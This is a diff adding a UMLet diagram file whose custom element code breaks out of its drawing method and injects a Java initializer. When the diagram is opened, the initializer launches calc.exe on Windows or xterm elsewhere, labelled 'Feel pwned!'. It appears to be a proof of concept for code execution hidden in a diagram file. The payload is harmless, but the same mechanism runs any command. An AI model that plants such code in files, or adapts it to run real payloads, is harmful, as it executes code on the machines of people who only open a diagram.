@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<diagram program="umlet" version="11.2">
+  <zoom_level>10</zoom_level>
+  <element>
+    <type>CustomElementImpl</type>
+    <coordinates>
+      <x>30</x>
+      <y>30</y>
+      <w>541</w>
+      <h>581</h>
+    </coordinates>
+    <panel_attributes>pwn</panel_attributes>
+    <additional_attributes/>
+    <custom_code>	printCenter("Feel pwned!",((height+textHeight())/2));
+}
+// stop the method above and create an initializer below :-)
+{
+try {
+	if (System.getProperty("path.separator").equals(";")) {
+		java.lang.Runtime.getRuntime().exec("calc.exe");
+	} else {
+	java.lang.Runtime.getRuntime().exec("xterm");
+	}
+} catch (Exception ex) {
+	javax.swing.JOptionPane.showMessageDialog(null, ex.toString());
+}</custom_code>
+  </element>
+</diagram>
